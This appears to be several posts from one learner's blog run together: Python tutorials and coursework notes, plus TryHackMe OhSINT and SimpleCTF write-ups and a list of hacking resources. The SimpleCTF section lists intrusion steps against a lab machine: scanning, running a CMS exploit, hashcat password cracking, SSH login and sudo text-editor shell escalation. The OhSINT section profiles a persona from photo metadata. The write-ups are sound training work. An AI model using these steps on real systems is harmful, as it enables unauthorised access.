the browser, easy hey?\nNow switch over to main.py and link to index.html. Copy print('Hello world') statement from your code and paste it into main.py. Update your PyScript tag to look like this \u0026lt;py-script src=\u0026quot;main.py\u0026quot;\u0026gt;\u0026lt;/py-script\u0026gt;. If you run the code again you shouldn’t see any changes, ‘Hello World’ should be printing as normal, but the difference this time is it’s now a separate Python file, great work.\nBefore moving on, add a new tag to your button \u0026lt;button pys-OnClick=\u0026quot;convert\u0026quot;\u0026gt;\u0026lt;/button\u0026gt;, this calls the function we’ll set up in main.py. Okay, let’s focus on building out our main.py program and seeing more of what PyScript can do.\nPyScript’s Elements() Class Alright, now in main.py it’s time to set your objects, this is going to allow PyScript to manipulate HTML elements. We do this by calling Elements('Element-ID') class, where 'Element-ID' is for example name in id=\u0026quot;name\u0026quot; and assigning it to a variable. For example, here’s how to create an object for the first input in index.html.\ninput_name = Element(\u0026#39;name\u0026#39;) Go ahead and repeat this for email and output.\nRemember, an object is an instance of a class, and a class has it’s own methods, i.e. functions designed for class objects. Let’s take a quick look at some other methods. If we run dir(input_name) we can see all the methods associated with the class, let’s print a few out.\nprint(input_name.id) print(input_name.element) print(input_name.value) Feel free to remove these print examples or highlight them and press CTRL/CMD + / to comment them out.\nProduce a complete, simple web app Okay, now you’ve got a better idea of what’s going on, let’s build out the main.py more.\nThe goal here is to take the user’s input from the input fields in index.html, let PyScript manipulate them and then display it back to the user.\nCode Check Let’s check our code before we go any further, here’s index.html.\n... \u0026lt;body\u0026gt; \u0026lt;section class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;section class=\u0026#34;notification\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;title\u0026#34;\u0026gt;Title\u0026lt;/h1\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Name\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;name\u0026#34; class=\u0026#34;textarea\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;email\u0026#34;\u0026gt;Email\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;email\u0026#34; class=\u0026#34;textarea\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;button\u0026#34; id=\u0026#34;convert\u0026#34; pys-onClick=\u0026#34;convert\u0026#34;\u0026gt;Convert\u0026lt;/button\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;notification\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;#output\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;py-script src=\u0026#34;main.py\u0026#34;\u0026gt;\u0026lt;/py-script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; And here’s main.py so far.\ninput_name = Element(\u0026#39;name\u0026#39;) input_email = Element(\u0026#39;email\u0026#39;) output_area = Element(\u0026#39;output\u0026#39;) Main.py Function Great work, so our button in index.html has an attribute of pys-onClick=\u0026quot;convert\u0026quot; which invokes a Python function called convert. Let’s code the convert function now.\ndef convert(*args, **kwargs): pass Currently, the convert function simply passes without doing anything else, it’s up to you to write this code. Implement an f string that writes to the output_area. Now to do this, there’s a write method, that’s convenient. Use output_area.write(), don’t forget to include input_name.value and input_email.value which uses the inputs values.\nIf you’re stuck, write an f string like this f'Hello, my name is {name}, and my email is {email} but using the methods listed above.\nAwesome, now it’s the moment of truth, run your code and see what you’ve got!\nPublish and Share If all goes well, you’ll have your first PyScript application running on HTML \u0026amp; Python, cool!\nNow it’s time to tell the world, tweet @mrashleyball and @pyscript_dev – we’d love to hear!\nIf you’d like to see my own implementation, here’s Mailto Me.

It’s a great introduction to the programming language Python. If you’re brand new to Computer Science (CS) or have a background in technology, CS50 covers the fundamentals really well. It’s one of the best places to learn Python online.\nFor me learning Cyber Security, I’m fascinated with the abilities programming unlocks like automation and threat detection. However, I’ve found learning any programming language really difficult. So, I write and share articles like this to help myself reinforce what I learn while (hopefully) distilling some help your way.\nDisclaimer, following CS50’s Academic Honesty, this article will be written as if you’ve asked for help and therefore will not show my code. However, I will share thoughts and Python constructs that helped me solve each one. PS, big shoutout to the CS50 community on Discord for their help, lots of amazing people there. PSS, I’m a fellow student, I’m not a professional nor do I claim my code is of any standard, code your way.\nFunctions, Variables Most of the starting psets involve functions such as input(), print() and a single variable.\nLet’s take a look at Week 0:\nIndoor Voice: this can be completed in 3 lines of code using string methods and a single variable.\nPlayback Speed: similar to indoor with 3 lines of code, but using a different string method. I used str.replace() to complete this problem set.\nMaking Faces: the same length of code again, and also the same string method can be used. If stuck, you can copy/paste emojis into your code editor.\nEinstein: a few more lines might be needed for this pset, here’s my pseudo code # E = mc2, mass + c (speed of light 300000000) squared. You’ll need to convert the user’s input to an int and use some math operators to get the end result.\nTip Calculator: this one escalates quickly imo, well for me anyway. I completed this pset within 20 lines of code, and multiple variables and defined the 3 recommended custom functions. You’ll need to strip and convert user input before returning the custom functions. Lastly, you’ll need to apply a simple math equation to get the correct percent.\nConditionals Next up are conditions, let’s tackle the psets for Week 1:\nDeep Thought: you can complete this within 5-6 lines of code, a single variable and one if else conditional statement. Note, you’ll need multiple conditions using logical operators for the single if statement, for help see Python Operators.\nHome Federal Savings Bank: a bit longer than deep at 7-8 lines of code and similar in logic, bank takes some more elif statements. Remember, if you want to use a character that python relies on, use \\\\ to force it e.g. 'What\\\\'s up?'.\nFile Extensions: ~15 lines of code can work for this pset, I used a lot of elif statements with a specific string method to check the end of the user input.\nMath Interpreter: takes about 15 lines like extensions, similar in logic but I used a few more variables. For help, take the user input, assign them to variables and then perform some conditional logic with the math operators. You can assign multiple variables at once and use the str.split() function so they’re assigned correctly.\nMeal Time: this is good to go on from math as it builds upon the same concepts like assigning multiple variables at once. You’ll need a couple more variables to make this pset work along with the condition, of course.\nLoops Python has a powerful set of constructs to repeat or iterate values we pass to it.\nLet’s look at Week 2:\ncamelCase: completed within 10 lines of code, this is the most nested of the psets so far, meaning there are more indented blocks of code. Relying heavily on the for loop (like most of the psets this week), you’ll need a couple more string methods like str.isupper() to complete this one.\nCoke Machine: the longest pset yet coming in at ~25 lines, there’s nothing new you haven’t used in the past psets besides a while True loop. Remember to start with checking the user input first before applying math to the variables.\nJust setting up my twttr: this is a fun one, coming in at about 10 lines for me, I used a simple for loop around an if condition to assess if a letter in a user string is a vowel.\nVanity Plates: this felt long a big leap forward, I recommend reading the instructions and listing all the steps. With nearly 50 lines of code, my program worked but was bloated and need reworking if I’m honest. Tip, it was easier to avoid slicing strings and focus on if conditions to match the beginning or end of the input.\nNutrition Facts: longer than some psets at ~30 lines due to using a dict, I solved this one without using a loop… whoops. It goes to show there are many ways to make the cat meow. For help, I recommend making a simple dict and not simply copying the lecture’s example. A single dict is much easier than a list with multiple dict‘s.\nExceptions Here are my notes for Week 3’s lecture, be aware you’ll use all of the concepts outlined in the psets.\nExceptions: when things go wrong with code i.e. errors. SyntaxError: missing syntax, can’t solve itself, you must. ValueError: can’t understand value e.g. string ≠ int. NameError: incorrectly using your own code e.g. local/global vars.\ntry statement attempts to run code, except handles errors, else in case all else. Best practice: try only surrounds suspect code producing errors. def own function, return more powerful than break, can shorten code. pass catches error but ignores it.\nNow let’s get into the psets:\nFuel Gauge: completed within 30 lines, it’s a good intro to applying try and except. After you check the user’s input, you’ll need to apply a bit of math to find the percentage of the given fraction, hint: divide each number and multiply by 100.\nFelipe’s Taqueria: in 20 lines of code, good exercise for understanding dict in more detail. Remember Week 2 info and all you need is to index the key’s value and add it to a variable.\nGrocery List: following taqueria and stressing your dict skills, I completed this pset in less than 15 lines. Remember you can use a for loop with two iterative values, meaning you can use that to print both keys and values. Also, don’t forget to print() in a sorted fashion i.e. alphabetical.\nOutdated: with less than 40 lines, this is another bloated monster that needs to be cut down… but it works! I looked at this as two functions, both matching each input allowed of dates, this is what makes the program so long. Essentially, take the input, pick a function, match it against its requirements and output in the new format. Tip, use the index() method to extract the location of the item as a number, you can +1 so it doesn’t start at 0.\nAlright, now Week 3 psets have come and gone, the wait for Week 4 is on. Enjoy the learning (struggle) haha.\nLibraries If interested, here’s my notes from W4’s lecture:\nLibraries: generic term module/package, other code/programs avaliable for use. modules: library implimented in a file with functions/features built-in. import \u0026lt;module\u0026gt;: imports all functions/features within single module. \u0026lt;module\u0026gt;.\u0026lt;function\u0026gt;(): allows the use of function e.g. random.choice(seq) seq = list(like). from \u0026lt;module\u0026gt; import \u0026lt;function\u0026gt;: only imports single function from module. \u0026lt;function\u0026gt;(): if single function is called, module name can be removed e.g. choice(seq). sys.argv (System Argument Vector): takes CL input/argument to use in program.\npackages: (3rd party) library implemented in a folder e.g. PyPi (Python Pacakge Index) \u0026gt; cowsay. pip: pre-built python program/packet manager for Python. API (Application Programming Interface): 3rd party services code can communicate with. requests: popular web requests module, pretends to be browser. JSON (JavaScript Object Notation): lang. agnostic format, non-dependant on JS, all lang. friendly.\nWith that out of the way, let’s get into the psets:\nEmojize: a lot easier than I expected being at W4, after import it can be completed in two lines of code. Make sure to read the documentation and use the right function from the emoji module.\nFrank, Ian and Glen’s Letters: this was a lot of fun as I’ve always liked ASCII Art. Really make sure to follow the module docs, it’s almost just a follow your nose situation. The only thing I’ll add is sys.exit(1) – you’ll know when you need it.\nAdieu, Adieu: I’ve never seen The Sound of Music so I’ve got no idea what’s going on. In confession, I didn’t use the module required but was still able to pass. Instead, I used a series of methods like join() and replace() which made it work… yes, I know it’s not right, but it’s what I got for now.\nGuessing Game: funny enough, I’ve completed a similar project so this wasn’t too challenging. Really it’s just using the random module and its function with a few try except and if elif else statements.\nLittle Professor: another good pset to stretch the custom function abilities, something I’m still struggling with. Focus on one function at a time, first get_level(), then generate_integer() and lastly main(). I completed it in about 40 lines of code, but I think it’s way to long for what it does.\nBitcoin Price Index: after professor this was much easier, I used the same problem-solving method and am now understanding why custom functions are so valuable. I created check_argv() and get_bc_value() both serve there own abstracted purpose. Regarding using json I didn’t need to import json but just used requests.get() and then the .json() method. Don’t forget you can index by specifying the key, example o['bpi'].\nUnit Tests I found Week 5 psets really hard and not as interesting as previous weeks. It’s worth taking your time to improve your code when reworking some previous psets. You’ll find it will deepen your understanding of earlier weeks. Also, no notes from me this week, see the official notes.\nTesting my twttr: reworking twttr shouldn’t be too difficult for you at this stage. If you follow the lectures, writing the test_twtter will be very doable, just take your time. Writing the test_twttr is also doable, don’t forget to import the function you’re testing and use assert.\nBack to the Bank: reworking bank left me with almost the same amount of lines, but more optimized and cleaner, I think. This pset is similar in spirit to twttr, again, take your time.\nRefueling: the rework saved me ~10 lines of code, but for test_fuel make sure to use pytest.raises() to test for errors. Otherwise testing your functions is similar to the other test psets.\nFile I/O Alright, Week 6, file in out, let’s go. Here are my notes for the week:\nTypically, python stores data in RAM (memory), until File Input/Output changes that. open() opens/reads file in a state e.g. a append, w write, x create, r read etc. write() writes to file, close() closes file. with open('\u0026lt;file\u0026gt;') as variable: can open and assign file, then close after block. readlines() method returns a list with each line is an item. lambda writing inline functions, no need to def custom function elsewhere.\ncsv module, apart of standard library, must import. csv.reader() reads csv files, can pass variable through. csv.writer() writes to csv files, can use writerow([\u0026lt;value 1\u0026gt;, \u0026lt;value 2\u0026gt;]). csv.DictReader() for dict uses key: value pair. csv.DictWriter() for dict uses key: value pair, specify fieldnames=['1', '2']. PIL pillow module, allows image manipulation, from PIL import Image.\nNotes done, now let’s see the psets:\nLines of Code: completed in ~30 lines of code, I used two functions 1) validate, and 2) find_lines. Don’t forget you can declare new variables when you define a function.\nPizza Py: around ~20 lines of code for this pset, two functions 1) validate, and 2) tab. To complete pizza use similar sys.argv code from the previous pset, and then a simple for loop. Make sure to read the tabulate docs for more detail.\nScourgify: in about ~40 lines with again, two functions 1) validate, and 2) clean_files, this time getting used to csv.DictReader(). Use next() to skip the heading, that could save you a lot of time, plus writeheader() too.\nCS50 P-Shirt: this was a lot of fun, moving from text/terminals to graphics/images is awesome. In approx ~30 lines, with again two functions of 1) validate, and 2) edit, this is all about the PIL library. You’ll need a few if, elif statements to validate and for the edit function use ImageOps.fit().\nRegular Expressions Great, now Week 7 RegEx (RE). I was worried about the increased difficulty of RE but glad to finally learn the language within the language. No custom notes from me so here are the official notes.\nNUMB3RS: great introduction to RE, with about 7 lines of code and one function of validate. Ensure to search() your pattern, if it matches then use an if statement to check and return either False or True.\nWatch on YouTube: similar length as numb3rs with the single function, this time called parse. The difference compared to the previous pset is using two separate patterns of RE.\nWorking 9 to 5: this ramped up in difficulty, about ~30 lines with a single RE pattern match, but over 9 if statements. Sure, my program passed but it could use some optimization. I took the group approach by splitting up the pattern match into multiple groups and then running conditions against them.\nRegular, um, Expressions: after work, this was a nice break, in just 7 lines of code again, um was a simple pset. Use findall() for this one!\nResponse Validation: great use of the validator_collection library, and again just 7 lines of code with a single function. Make sure to read the docs linked and don’t overthink it.\nObject-Oriented Programming Well Week 8 nearly broke me, I thought Unit Testing was a challenge, that was nothing compared to Object-Oriented Programming (OOP). In short, I passed all psets with significant assistance from a work colleague, CS50P staff and fellow students via Discord. I couldn’t have done it without them.\nSeasons of Love: ah, seasons I hate you, haha, no, you are a good learning experience. I’m not going to pretend like I fully understand classes, but a single class with five methods did the trick for me.\nCookie Jar: in ~40 lines, this was extremely difficult like seasons, a single class with six methods. All I know is I need to rewatch the lecture, I’m sorry I am of no help here.\nCS50 Shirtificate: this was actually a nice last pset as it was a bit challenging but pretty straightforward. After the last two psets, I think it was nice to end on an easier one imo. Less than 20 lines, just a single main function and six methods from FPDF() – and that’s it!\nEt Cetera No psets for this week, just the final project, how exciting! Stay tuned as I’ll be writing a full breakdown of my final project along with a course review and reflection.\nThanks for reading and I hope you learned something from this little exercise.

Check the metadata of the image, then use a search engine. What city is this person in? Use search results based on the metadata. Whats the SSID of the WAP he connected to? Zoom in on the city found. What is his personal email address? Check all profiles. What site did you find his email address on? Did you check? Where has he gone on holiday? Again, check each profile found. What is this persons password? Right-click, inspect. Steps Enumerate image using file. More enumeration using exiftool WindowsXP.jpg Use a search engine to find information about each profile based on the metadata above. Note, something I even missed the second time around, see the metadata in the search results. Based on the information found on each profile/site, use wigle.net to search the BSSID. Take your time, unlike me who rushed and missed the purple circle on the city. Continue to search each site/profile for this user to answer the last challenges.

There’s a good lesson in there to slow down and observe more with OSINT. Sometimes clues are right in front of us and skimming doesn’t help, a bad habit I do a lot.\nThe last challenge was a bit annoying if I’m being honest. It’s not a big deal and even though it’s not realistic, there’s a good lesson in there… somewhere. I think as my first OSINT room, it was really good, I’m very keen to do more challenges like this.\nI was expecting a lot more involvement with the initial image, in fact, I thought most of the room was going to revolve around it. It was good using search engines though, it can be an underlooked skill when starting off in Cyber Sec.\nSo there it is, OhSINT, I hope you enjoyed this write-up and feel free to check out the YouTube channel for more video walkthroughs.

Check what can be run with sudo -*. What’s the root flag? cat /root/root.txt Steps Enumeration as always, start with nmap -vv -A \u0026lt;ip\u0026gt;. With ports 21, 80, and 2222 open, we can see what we can find logging into ftp via anonymous via ftp \u0026lt;ip\u0026gt;. I didn’t find anything but checking out other writeups, it looks like my THM VM didn’t work as intended. More enumeration, since we have a website, let’s navigate to http://\u0026lt;ip\u0026gt; and see what we can find. After manually searching, not a lot there, let’s use dirsearch -u http://\u0026lt;ip\u0026gt; to find /simple/ directory. Navigating to http://\u0026lt;ip\u0026gt;/simple, we can find a system called ‘CMS Made Simple’ or CMSMS for short. Find the exploit using locate 'php/webapps/*****.py', then make a copy using cp /usr/share/exploitdb/exploits/php/webapps/*****.py . Getting the exploit working, now, this took a bit of time and this makes me call it ‘Not So SimpleCTF’… the correct CVE exploit is written in Python 2 with missing modules that are working in Python3. To fix this, run sudo apt install 2to3, then 2to3 *****.py, this will convert the exploit from Python 2 to Python 3. Using the exploit by running python *****.py -u http://\u0026lt;ip\u0026gt;/simple, note this took me twice to get the correct results. I tried a third time and the resulted varied, so you are warned, try a few times to make sure you get consistent results. Crack the password, use hashcat -O -a 0 -m 20 '\u0026lt;salt\u0026gt;:\u0026lt;hash\u0026gt;' \u0026lt;wordlist\u0026gt;.txt --show. To explain, -m 20 sets hashcat to md5 with salt:hash which is perfect from the exploit we ran. Access via ssh, run ssh mitch@10.10.44.147 -p 2222, don’t forget to specify the port number from the earlier nmap scan. Lastly, escalate privileges, now like other steps, this isn’t so simple either, but do your best to not cheat and search around. I’ll give you a hint, you can use a certain text editor as sudo which can spawn a bash shell with :!bash. Reflection This was a fun CTF from MrSeth6797 (Twitter, Website, Writeup), I would recommend this to any fellow hacking beginner. I think the basics are always important, this reinforced the importance of searching for known vulns and exploits. And also how exploits can be a bit finicky, like needing to convert the exploit from Python 2 to 3.\nI use to get a bit annoyed by rooms like this, where it wasn’t clear with things like this. But after a bit more learning, this is how technology is. Things change, the creator of that exploit wrote it in Python 2, I assume at the time Python 3 wasn’t around. So fast forward to now, our Linux systems have both Python 2 and 3, but modules might only work with 3, not 2.\nSo yeah, all these sorts of issues become less frustrating the more I learn, and it just becomes a part of the process. I’m also leaning into writeups and the THM Discord more and more. I’ve spent too long banging my head against the wall and going off track. It’s all a part of learning, but writeups can be used in a way that you don’t need to see all the answers, scrolling is a thing.\nSimpleCTF is a good, solid CTF from THM, like I said, not so Simple, but in the end, it’s worthwhile.

She creates content about herself living in London while studying Medschool.\nHer latest video You\u0026rsquo;re Not Stupid: How to Easily Learn Difficult Things caught my attention. As someone who feels dumb 90% of the time, this is perfect, and the timing couldn\u0026rsquo;t be better as I\u0026rsquo;m learning computer science and programming.\nMore specifically, a thing called object-oriented programming (OOP) is really hard for me to understand. So, I thought a following along with her video would help me learn OOP.\nDisclaimer, refer to Elizabeth\u0026rsquo;s video for better detail on her outlined steps. I don\u0026rsquo;t claim to own the concepts and ideas presented in her video.\nPrep Your Brain Elizabeth\u0026rsquo;s video has six parts, I\u0026rsquo;m simplifying them here by combing the first and last three parts together, respectively.\nContext-Broadening: find ‘real-world\u0026rsquo; stories to make a topic exciting which increases curiosity and emotional interest. Dopamine Priming: when excited, this builds desire, and finds more relatable aspects of the topic. Singular Deep Dive: in the article or story, find an adjacent topic to dive into further. Alright, let\u0026rsquo;s use my topic of OOP, the first step is to search and selects the news section. I found “Robotic eyes unconstrained by human perception” which caught my attention, and after reading, well, listening via Speechify, I was surprised to see how OOP is being used in the real world. Here\u0026rsquo;s an amazing article about robots being trained via AI, machine learning and neural networks with OOP being involved.\nOkay, unlike Elizabeth\u0026rsquo;s example in her video, I can\u0026rsquo;t find a story per se, the article I read was more facts presented in a well-written format. So then, there\u0026rsquo;s no emotional investment as of yet. The next step is dopamine priming, the best I can do here is “robotics/AI/neural networks are cool, can change the world”? Again, there\u0026rsquo;s no dramatic story that has me hooked on OOP being super important and something I must understand.\nInstead of searching for another story, I\u0026rsquo;ve powered on and used the third step of a singular deep dive into Artificial Intelligence (AI). Now there are more stories around AI like “Artificial intelligence on the hunt for illegal nuclear material.” Um, awesome, here\u0026rsquo;s how the hunt for criminals illegally sending/receiving nuclear materials is being tracked, that\u0026rsquo;s insane. This is a much better article for me to get emotionally invested in to learn OOP.\nDo The Thing Right, with my brain being prepped to learn OOP, now let\u0026rsquo;s look at the next three areas Elizabeth covers.\nChallenge Sandwich: either do a project/lecture/quiz around the topic. Getting Broody: acknowledge the topic will take longer to absorb. False Deadlines: spend more time repeating the topic in various ways. Great, with those in mind, using OOP, which I still don\u0026rsquo;t understand or know anything about. Besides, of course, it\u0026rsquo;s being used in AI to help track down the bad guys in Back to the Future Part 1.\nFor me, it was a case of going back to the course lecture from CS50P and following along with the professor as they coded. I found that I was more engaged and followed along much better than I did before. I felt like I had a much clearer head, and less brain fog to focus and I finally managed to get through the entire 4-hour lecture.\nHonestly, however, this is where Elizabeth\u0026rsquo;s video sort of fell apart for me to a degree, I wasn\u0026rsquo;t associating any of the articles I read with what I was learning. Know this may just come down to the fact I\u0026rsquo;m learning something very different to what she uses as an example in her video. Or perhaps I haven\u0026rsquo;t read the right story or article to do this process. However, so far, this hasn\u0026rsquo;t made learning OOP easier overall.\nReflection + Next Steps I love Elizabeth\u0026rsquo;s content and will continue to watch her videos, this hasn\u0026rsquo;t been a reflection on her at all. I think she has a great process that works well for her, I also think it can be adapted to work well for me too.\nEven within this article, her steps can be highly refined and simplified to better fit in with how I learn. I don\u0026rsquo;t think breaking everything up is necessarily the best way for this, I prefer two clear steps.\nThis is in part because I find researching difficult, which most others may not, but I can\u0026rsquo;t help but get distracted while reading all the different articles. I\u0026rsquo;m finding a combination of neuro scientific music and Pomodoro focus techniques is helping with these tasks.\nAll in all, OOP still stands as a difficult topic, I wouldn\u0026rsquo;t say this process made it easy. But, I did learn the value of searching news articles and broadening my context on a single topic. I\u0026rsquo;m absolutely going to do more of this when new topics arise and/or when I\u0026rsquo;m stuck on a particular topic.\nDon\u0026rsquo;t forget to check out Elizabeth\u0026rsquo;s channel, and subscribe if you like it.

With its straightforward learning approach, and succinct program examples and explanations, it’s many hobbyists’ go-to book for Python.\nThis article breaks down my personal solutions to the practice projects outlined at the end of most chapters. As I continue to learn Python and generally computer science, I enjoy seeing how others solve coding problems.\nAll practice projects can be found via this GitHub Repo, feel free to clone it and/or use it however you like, note, please read the disclaimer before doing so below. Also see the cloned Replit, to use the programs use the Console with the command format of python folder/file.py.\nDisclaimer, this is for version 2 of the book, code is written of my own doing, any assistance will be mentioned or linked. Highly recommended you solve practice projects yourself before seeing other’s code, don’t rob yourself of any learning opportunities. I do not claim to be a professional, please share any suggestions or feedback to improve my code or this article.\nLists Comma Code The first practice project comes in chapter 4 which involves taking a list and printing out the items as a new string. This can be solved using two variables, a for loop and indexing. The tricky part is solving how to print the items but to do something different on the last item.\nThe program takes the list, loops through it and adds each item to a string.\nTo define a for loop up until but not including the last item in the list, you can use a negative index [:-1]. This way each item can be added to the new string as intended, but the last item can be added with the 'and '.\nNote, that I’ve used format (f) strings in my example below.\ndef main(): print(makestring([\u0026#39;apples\u0026#39;, \u0026#39;bananas\u0026#39;, \u0026#39;tofu\u0026#39;, \u0026#39;cats\u0026#39;])) def makestring(l): s = \u0026#39;\u0026#39; # Define blank new string for i in l[:-1]: s += f\u0026#39;{i}, \u0026#39; # Print out each item in the list as a new string, except the last item s += f\u0026#39;and {l[-1]}\u0026#39; # Print out last item with \u0026#39;and \u0026#39; return s if __name__ == \u0026#39;__main__\u0026#39;: main() Coin Flip Streaks Alright, next up is finding streaks within random coin tosses, this was a bit of a tricky practice project, but a really good one. To map out the program, I used pseudo code, this helped me get a better idea of the steps involved. Simply, the program will toss a coin a certain number of times, store each toss as an item in a list, and then loop through the items to find a streak.\nI broke this program into two functions, 1) flip, and 2) streak. This keeps things organised, makes coding easier and abstracts away elements within the program.\nSo, the flip function is solely responsible for taking a number from the user, flipping the coin based on that number and storing the results in a list.\nThen, the streak function takes that list to find the streaks, this was the most difficult part of the practice project. I found this Reddit post via r/learnpython which made things more simple for me. The problem was tracking if a streak was found or not, since we can use a for loop we know the current item. With that and indexing, we can figure out if we have a streak.\nSo, inside a for loop, using an if condition to match the current item to the last if that matches then a streak counter increases. This way, every item must be the same as the last to count up, once that counts up to a certain number, in this case, six, then we have a streak.\nA separate variable called streaks increases and that is the final output that feeds back to the user.\nfrom random import randint def main(): print(\u0026#39;Streaks: \u0026#39; + str(flip(input(\u0026#39;Number of flips: \u0026#39;)))) # Prints output to terminal def flip(number): coin_list = [] # Create empty list to store coin tosses for i in range(int(number)): # Loop thourgh number provided by user coin = randint(0,1) # Each loop give random 0 or 1 coin_list.append(coin) # Add random 0 or 1 to list return streak(coin_list) # Pass list through streak function def streak(l): streaks, streak = 0, 0 # Create counters for a single streak, and the overal amount of streaks # Loop through the list of coin tosses for i in range(1, len(l)): if l[i] == l[i-1]: # Check if the current toss is equal to the last toss streak += 1 # If so, count up on the streak else: streak = 0 # Otherwise, set the streak back if streak == 6: # Now check for a total of six in a row streaks += 1 # Add to the overal amount of streaks streak = 0 # Reset the streak counter back to nothing return streaks if __name__ == \u0026#39;__main__\u0026#39;: main() Character Picture Grid This practice project took a lot of internal visual imagery to work for me, it reinforced the for loop which was great. As per the hints, you can use a for loop inside a for loop it feels a bit inception-like at first.\nWhat helped me, was referring back to the list stored within grid, the first for loop is iterating over each list of items, and the second is iterating over each item within the lists. I know, it’s a bit confusing, but the more you go over it, the more it makes sense.\nTo help break this down further, I used the names rows and columns instead of the x and y axis, that just helped me. The draw function starts with declaring these variables and stores integer values, these match the item I want to first print out.\nWithin the second for loop we want to print out using indexing, this way we can print exactly the item we want.\nSince we’re starting out in row position 8, and column position 0, meaning the first column and the last row item. Then we go up row by row within the second for loop, then column by column within the first for loop. Once the program reaches column 5, then it breaks out of the loop, and the character picture grid has been rotated and printed out to the terminal.\ngrid = [[\u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;], [\u0026#39;.\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;], [\u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;], [\u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;.\u0026#39;], [\u0026#39;.\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;], [\u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;.\u0026#39;], [\u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;], [\u0026#39;.\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;], [\u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;]] def main(): draw(grid) def draw(l): row, column = 8, 0 # Start in bottom left of grid list for i in l: # Loop through lists in grid for j in l: # Loop through items in each list print(l[row][column], end=\u0026#39;\u0026#39;) # Print out as per starting point row -= 1 # Reverse up the column, results in row output if column \u0026lt; 5: # Go until row 6 (0-5) row = 8 # Reset column back to the bottom or last column += 1 # Move up a row to being new row print(\u0026#39;\u0026#39;) # Print new line else: break # Once greater than 6th row, break and exit out if __name__ == \u0026#39;__main__\u0026#39;: main() Dictionaries and Structuring Data (Coming Soon)\nThis is day 50 of #100DaysOfHacking on my Hackers Learning Path.

But what is hacking and how do people learn it?\nHere’s a vetted list of resources to learn computer hacking. Starting out is hard work, so that’s why I’ve put this list together, to help demystify hacking for you.\nThe good news is anyone (including you) can learn to hack, and in even better news, it’s a lot of fun. All you need is effort and time, most of the resources are completely free.\nDisclaimer, approx times and prices are included for each resource, check links confirmation. Start with the fundamentals, otherwise, there’s no particular order, learn how you like.\nMindset If you don’t like goal setting or mindset stuff, feel free to skip to Fundamentals, but it’s worth setting your expectations. Learning to hack is hard work, so start embracing problem-solving, why? Hacking is a series of solving smaller problems to solve a larger problem.\nThink about it like this, climbing ladders vs rock climbing. You expect learning to be like climbing up a ladder. Each piece of information is like a rung on a ladder and with each step up you understand it and safely climb to the top – you’re a hacker.\nOffline checklist to track your learning path, become a great hacker and stay on task.\nTo hack something, you need to understand that thing, so hacking computers can take years. Here are a few tips, 1) don’t quit when it gets hard, 2) be prepared to read a lot, 3) take your time, re-read information, 4) find a good support network, 5) take breaks from studying.\nFundamentals Technology is a massive industry and hacking falls under Cyber Security which is also a massive industry in itself. To stand a chance in this industry, you need skills in basics computing, here’s what’s recommended:\nOperating Systems (OS): Linux (Ubuntu, Kali), Windows, Windows Server (Active Directory). Virtualization: Type 1 (Proxmox), Type 2 (VirtualBox, VMWare Workstation, Hyper-V). Networking: TCP/IP, DNS, DHCP, IPv4/6. Programming/Coding: Web (HTML, CSS, JS), Python, BASH, Perl. Start with Hoppers Roppers Computing Fundamentals 50hr free, this introduces you to the above areas and most importantly, the Linux kernel. Linux allows the most dominant OSs which run the internet. In order to hack, Linux is a must, so to bounce around while learning Linux, try:\nOccupyTheWeb’s Linux For Hackers 8hr free, Linux Unhatched (course notes) 8hr free, NetworkChuck’s Linux for Hackers 3hr free, My Linux Quick Start Guide 10m free.

